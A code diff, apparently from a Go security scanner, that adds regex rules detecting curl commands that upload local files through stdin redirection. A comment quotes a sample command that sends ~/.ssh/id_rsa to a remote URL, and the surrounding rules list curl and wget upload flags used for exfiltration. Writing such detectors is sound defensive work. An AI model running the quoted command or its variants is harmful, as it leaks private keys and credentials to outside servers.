@@ -82,6 +82,11 @@ var networkPatterns = []networkPattern{
 	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*(--upload-file|-T)[=\s]`), "curl uploading a local file to a remote server"},
 	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*--post-file[=\s]`), "curl posting a local file to a URL"},
 	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*-F\s+.*=@`), "curl uploading a local file as form data"},
+	// curl/wget reading the request body from stdin combined with an input
+	// redirection — "curl URL -T- < ~/.ssh/id_rsa" uploads the file's
+	// contents without ever naming it as a file argument (#373).
+	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*(--upload-file|-T)[=\s]*-\s*<`), "curl uploading stdin (redirected from a local file) to a remote server"},
+	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bcurl\b.*(-d|-data|--data|--data-binary|--data-raw|--post-file)?[=\s]*-?\s*<\s*\S`), "curl with input redirection sends a local file as request body"},
 	{NetworkExfiltrate, regexp.MustCompile(`(?i)\bwget\b.*--post-file`), "wget posting a local file to a URL"},
 
 	// scp/rsync to remote hosts (destination contains user@host: pattern)
